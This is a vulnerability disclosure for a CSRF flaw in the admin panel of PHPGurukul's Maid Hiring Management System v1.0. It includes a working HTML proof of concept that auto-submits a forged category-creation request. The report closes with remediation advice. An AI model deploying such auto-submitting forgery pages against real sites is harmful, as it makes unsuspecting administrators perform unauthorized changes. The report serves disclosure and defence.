**Project Name & Repo URL:**
[Maid Hiring Management System using PHP and MySQL](https://phpgurukul.com/maid-hiring-management-system-using-php-and-mysql/)

**Vulnerability Type:**
Client Side Request Forgery

**Affected Version(s):** v1.0

**💣Vulnerability Description:**
A Cross-Site Request Forgery (CSRF) vulnerability exists in the admin panel of PHPGurukul Hiring Management System, allowing an attacker to add arbitrary hiring categories by tricking an authenticated admin into visiting a malicious site. This can lead to data pollution and unauthorized admin-level changes.

**👩‍💻Impact:**
Unauthorized category creation

**🛜Proof-of-Concept (PoC)**
1)There was a category add functionality where only authenticated admin can add category.
![1](https://github.com/user-attachments/assets/6547be87-9f43-4e34-b8c0-e4138ac3f9e3)
2)HTML code to send POST request to the endpoint `/admin/add-category.php`
**CSRF-POC**
![2](https://github.com/user-attachments/assets/cc01b049-b558-4020-8a0c-c3f0792f0cf7)
```
<html>
  <body>
    <form action="http://127.0.0.1/mhms/admin/add-category.php" method="POST">
      <input type="hidden" name="catname" value="CSRF&#45;POC" />
      <input type="hidden" name="submit" value="" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```
3)Use the HTML code and craft a malicious URL.
![3](https://github.com/user-attachments/assets/3c0305b7-e978-4926-8652-b536d6702cc3)
4)After Admin clicks on the link, new category will be added.
![4](https://github.com/user-attachments/assets/b32f250a-9eeb-497a-990f-8b9b6a7fb1e3)
![5](https://github.com/user-attachments/assets/c05d5f4e-c1c5-4856-9ca2-f3c0d26c7c7b)

**Recommendation:**
Implement of CSRF tokens in admin forms, enforce SameSite cookies, and validate request origin to prevent unauthorized actions.
